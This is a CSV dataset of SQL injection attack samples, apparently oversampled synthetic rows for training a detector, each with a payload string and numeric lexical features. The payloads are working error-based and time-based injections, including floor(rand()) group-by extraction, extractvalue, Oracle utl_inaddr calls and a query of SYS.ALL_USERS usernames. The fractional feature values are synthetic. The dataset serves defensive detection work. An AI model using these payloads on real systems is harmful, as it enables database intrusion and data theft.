id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000363,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,2.2435068539111795,338.6390951170506,34.0,3.504329716510307,81.8195475585253,50.63533933110602,146.90977377926265,59.27443444815663,0.24157713609278908,0.14959841373163818,0.4338494088939872,0.17497504128158553,1.8195475585253063,0.0,0.5451131103686733,0.0,0.0,2.4548868896313265,0.0,30.545113110368675,0.9097737792626532,0.0,1.0,23.0,0.4548868896313266,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.9097737792626532,0.5451131103686734,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.454886889631327
SMOTE_000364,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,0.6636986213382288,217.05660829599697,37.26625089688654,3.7646377457406994,64.4674982062269,37.0,90.79875269065963,24.79035739911044,0.2973168053709156,0.1704908804057792,0.4179988480539941,0.11419346616931109,1.3144639013343387,0.0,0.8951786995552204,0.0,0.8951786995552204,1.1048213004447796,0.0,16.475893497776102,0.0,0.0,3.209642600889559,2.8951786995552204,1.0,0.0,0.0,0.8951786995552204,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.10482130044477966,0.8951786995552203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8951786995552204,0.0,1.0,1.0,5.8951786995552204
SMOTE_000365,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,1.00581886905181,235.58902850092312,40.29422110881606,3.87752974060224,71.41214406565888,43.117922956842825,96.05896147842141,25.0,0.3028044198628703,0.18272323175715827,0.40816311910826486,0.10630922927170662,0.23525963039464703,0.764740369605353,1.0,0.0,1.0,1.764740369605353,0.0,16.235259630394648,0.0,0.0,3.0,3.764740369605353,0.2352596303946471,0.7647403696053531,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.764740369605353,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.764740369605353
SMOTE_000366,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,0.6457979036029832,331.8527376244814,36.0,3.6777615941430146,92.0,48.0,135.0,56.852737624481406,0.27723171967520577,0.14464263635228125,0.4068074147407911,0.1713182292317219,0.0,0.0,2.7054752489628044,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,24.705475248962806,0.0,0.0,0.8527376244814022,0.1472623755185978,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000367,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,1.6282898224511761,297.55749036176934,38.814169879410215,4.010429094036433,109.37166024117957,43.0,108.4070849397051,36.77874518088468,0.3675353360793364,0.1445241260141034,0.36437547078050386,0.12356506712605633,2.7787451808846786,0.0,0.8141698794102143,0.0,2.0,2.0,0.0,20.0,0.0,2.0,5.0,6.0,1.0,0.0,0.4070849397051072,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.592915060294893,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.592915060294892
SMOTE_000368,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,0.5477308914916541,238.0533896964776,40.615659525627514,3.8964842324362468,72.59075159396755,43.97509206834004,96.48754603417001,25.0,0.30473981302308495,0.18454441836629595,0.40557919589014896,0.10513657272047014,0.12811349145749507,0.8718865085425049,1.0,0.0,1.0,1.871886508542505,0.0,16.128113491457494,0.0,0.0,3.0,3.871886508542505,0.12811349145749523,0.8718865085425049,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.8718865085425048,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.871886508542505
SMOTE_000369,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,1.2379754827850844,338.7380887890298,34.0,3.493178716989066,81.49523551561192,53.24602959634327,146.49841183853732,57.49841183853731,0.24052756328023547,0.15712613473556883,0.43259025162227416,0.16975605036192154,0.0,0.24920591926865376,1.249205919268654,0.0,0.0,2.249205919268654,0.0,30.750794080731346,0.0,0.0,1.0,23.498411838537308,0.0,0.24920591926865382,0.2492059192686538,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.24920591926865382,1.0,0.24920591926865387,0.7507940807313462,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.249205919268654
SMOTE_000370,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,1.1512664898688345,337.8345847724065,34.47243079540108,3.5362439189048,84.48809255631026,51.05513840919784,144.58270761379674,57.70864619310162,0.24978918856356336,0.15123293869771723,0.42817633166029134,0.1708015410784281,0.0,0.9448615908021621,1.0,0.0,0.0,2.2362153977005406,0.0,30.29135380689838,0.0,0.7086461931016216,0.7637846022994594,23.23621539770054,0.0,0.23621539770054062,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.23621539770054056,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.236215397700541
SMOTE_000371,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,0.6097227702409254,232.34775739190616,33.516325815029326,3.9006380185700493,79.14122706589443,44.17387869595308,84.03265163005865,25.0,0.3402508975275405,0.18997566322075676,0.3621261000922433,0.10764733915945945,1.8967348369941348,0.0,0.10326516300586519,0.0,0.1032651630058653,1.8967348369941348,0.0,14.309795489017596,0.0,0.0,4.79346967398827,3.896734836994135,1.0,0.0,0.0,0.10326516300586519,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8967348369941348,0.0,0.8967348369941349,0.0,0.0,0.10326516300586519,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.10326516300586513,0.0,1.0,1.0,6.0
SMOTE_000372,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,0.43277168505002733,278.66362903418815,37.072331697138615,3.9347797524097254,99.86798036566337,35.578653577108916,105.21699509141584,38.0,0.35831204918055515,0.12758194975526577,0.3776826304660943,0.13642337059808485,0.2893267885544586,3.710673211445542,0.0,0.0,2.0,2.0,0.0,20.0,1.8553366057227705,2.0,5.0,4.14466339427723,0.07233169713861465,0.9276683028613855,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0723316971386145,0.0,0.07233169713861465,2.0,0.9276683028613854,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.072331697138615
SMOTE_000373,attack,error,"1'   )    )    as clhk where 4607  =  4607 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000023,1.575300331717021,280.05558421945426,38.7604963750626,3.997268746734324,102.97161321895345,40.520992750125195,102.80248187531299,33.7604963750626,0.3681488781642312,0.14449337140535307,0.3666211921348183,0.12073655829559743,1.0,0.0,1.3802481875313,0.0,2.0,1.6901240937656499,0.0,19.3802481875313,0.0,2.0,5.30987590623435,5.07037228129695,1.0,0.0,0.6901240937656499,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.6901240937656499,2.0,0.0,0.6901240937656499,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.380248187531299
SMOTE_000374,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,0.35310928487914905,331.9194798994873,36.0,3.678369846567003,92.0,48.0,135.0,56.91947989948734,0.2771758440036324,0.1446134838279821,0.40672542326619965,0.17148524890218594,0.0,0.0,2.838959798974673,0.0,0.0,2.0,0.0,28.0,0.0,3.0,0.0,24.838959798974674,0.0,0.0,0.9194798994873365,0.08052010051266334,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000375,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.1084986273640415,213.8459748433693,39.944526239779066,4.190386291648088,116.87518403950288,2.4576585218227436,71.3605794414361,23.15255284060758,0.5471442915551199,0.011030967332536668,0.3336201502201204,0.10820459089222303,3.0138684400552345,0.0,0.0,0.0,0.02773688011046893,2.9861315599447655,0.0,10.110947520441876,0.0,3.972263119889531,1.0554737602209379,3.0138684400552336,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.013868440055234466,0.0,2.0138684400552345,0.0,0.9861315599447655,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.013868440055234466,0.0,0.0,0.0,0.0,0.0,0.013868440055234466,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.013868440055234466,0.0,0.0,0.0,7.041605320165703
SMOTE_000376,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,2.560658407341952,283.03093054555825,37.80618610911166,4.012477185581526,107.54845347272209,38.61237221822331,102.41855832733496,34.45154652727791,0.38051710304143155,0.13610044464346102,0.36157064301567393,0.12181180929943353,2.64536041816626,0.0,0.9030930545558269,0.0,2.0,2.0,0.0,18.903093054555825,0.0,2.0,5.0,4.903093054555827,1.0,0.0,0.45154652727791333,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.4515465272779134,2.0,1.0969069454441733,0.45154652727791333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000377,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,3.8789558372332626,250.68430254420286,39.133694194386145,4.119639431161571,114.40108258315843,19.7592690150841,87.02665740385639,29.49729354210394,0.47163328939813787,0.06740775735719105,0.3448840774081848,0.11607487583648629,3.4331529028069294,0.0,0.0,0.0,0.8663058056138587,2.5668470971930706,0.0,14.331529028069294,0.0,3.1336941943861416,2.7326116112277172,4.299458708420788,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.4331529028069293,0.0,2.8663058056138584,0.0,1.0,2.0,1.1336941943861414,0.4331529028069293,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.43315290280692925,0.0,0.0,0.0,0.0,0.0,0.4331529028069293,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4331529028069293,0.0,0.0,0.0,8.732611611227718
SMOTE_000378,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,0.5879048032782735,191.18303575561026,31.0,3.679061140746769,64.8094455169965,24.809445516996504,77.62640976138624,23.937734960231037,0.3388083696769146,0.12947372928971768,0.4064150356516188,0.12530286538174895,4.0,0.0,0.0,0.0,0.0,0.12453007953792361,0.0,15.750939840924154,0.0,0.0,4.0622650397689615,0.12453007953792472,1.0,0.0,0.0,0.0,0.0,0.062265039768961916,1.0,0.0,0.0,1.0,0.0,0.06226503976896147,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9377349602310381,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.06226503976896186,0.06226503976896186,3.124530079537924
SMOTE_000379,attack,error,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000012,1.0353840488448598,335.34369412955743,38.71042039136284,3.8616546516505017,104.02705726046014,55.0,135.3166368690973,41.0,0.3101470334421655,0.16407712504474392,0.40346380284337235,0.12231203866971818,4.0,0.0,0.0,0.0,2.0,2.0,0.0,24.579159217274324,1.4208407827256755,0.0,6.0,5.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.710420391362838,0.28957960863716203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000380,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,2.4090474674784015,279.6456752500335,34.280436557694884,3.720686173239557,89.33870665770827,35.68782537692205,116.40218278847442,38.21696042692874,0.31737393307101114,0.12972761938803595,0.4166701567030638,0.1362282908378891,0.0,4.0,0.0,0.0,1.3121746230779534,2.0,0.0,21.93652386923386,1.9999999999999996,1.3121746230779532,5.0,3.3121746230779534,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.3121746230779534,0.0,0.0,1.3121746230779532,1.6560873115389765,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6560873115389765,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6560873115389766,0.0,0.3439126884610234,0.3439126884610234,8.280436557694882
SMOTE_000381,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.9652160119413455,272.0443873734006,36.78224505063976,4.073217249350693,111.9112252531988,31.773239166110997,95.04438737340061,33.31553558069021,0.41259385428830975,0.11601692587857625,0.3490409874862335,0.12234823234688053,3.9022193686700306,0.0,0.0,0.0,1.8044387373400606,2.1955612626599397,0.0,17.21775494936024,0.0,2.488903156649849,4.608877474680121,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.9022193686700302,0.0,2.90221936867003,0.0,0.19556126265993964,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9022193686700302,0.0,0.0,0.0,0.0,0.0,0.9022193686700302,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9022193686700302,0.0,0.0,0.0,9.80443873734006
SMOTE_000382,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000009,2.879390888937329,222.2039743952408,35.68091491017255,3.8401373811565715,71.34870632337883,40.71053614372393,86.21709789220705,23.92763403593098,0.3198894402849569,0.18277468573305844,0.3896119785512713,0.1077238954307134,0.9276340359309819,0.0,0.536182982034509,0.0,0.536182982034509,1.463817017965491,0.0,15.072365964069018,0.0,0.0,3.927634035930982,3.463817017965491,0.463817017965491,0.0,0.0,0.536182982034509,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.463817017965491,0.0,0.463817017965491,0.0,0.0,0.5361829820345089,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5361829820345089,0.0,1.0,1.0,6.0
SMOTE_000383,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000021,2.7042276792259683,289.5026649361171,36.0,3.8845557457373805,103.57066716110938,35.0,112.50266493611716,38.429332838890616,0.35926034452848793,0.12118004939377267,0.387175178780064,0.1323844272976754,1.785333580554693,2.214666419445307,0.0,0.0,2.0,2.0,0.0,21.321999629167962,1.1073332097226536,2.0,5.0,4.0,0.4463333951386732,0.5536666048613269,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000384,attack,error,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000017,1.1138406600007884,286.33379068439035,36.62664837262439,3.8677155865542097,99.37335162737561,35.0,112.46703254751228,39.49340650950246,0.3475909475103211,0.12244862560124246,0.39207115013986077,0.13788927674857565,0.0,4.0,0.0,0.0,2.0,2.0,0.0,21.493406509502456,1.9999999999999996,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.3733516273756137,0.6266483726243861,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000385,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,0.24045598726243184,209.34178793848304,31.26583506326457,3.947762092152799,76.46832987347085,37.0,72.79750518979372,23.075952875218448,0.3654045755737723,0.17675593359106556,0.347615773080552,0.11022371775461012,3.886070687172326,0.0,0.03797643760922487,0.0,0.03797643760922487,1.9620235623907754,0.0,12.189882188046123,0.0,0.0,4.92404712478155,2.037976437609224,1.0,0.0,0.0,0.0379764376092246,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9620235623907752,0.0379764376092247,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0379764376092247,0.0,1.0,1.0,5.037976437609224
SMOTE_000386,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,1.9798384482355622,340.09141344166756,38.9329347197367,3.911022803267243,109.31097823991223,57.48782591929786,134.1584787219309,39.13413056052661,0.3216721854472067,0.16943981924294554,0.393955775419499,0.11493221989034871,2.756087040351069,0.31097823991223267,0.6219564798244653,0.0,2.0,2.0,0.0,24.445108800438838,0.0,0.0,6.0,5.621956479824465,0.6890217600877674,0.3109782399122326,0.3109782399122326,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.3109782399122326,1.0,1.0,0.6890217600877673,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
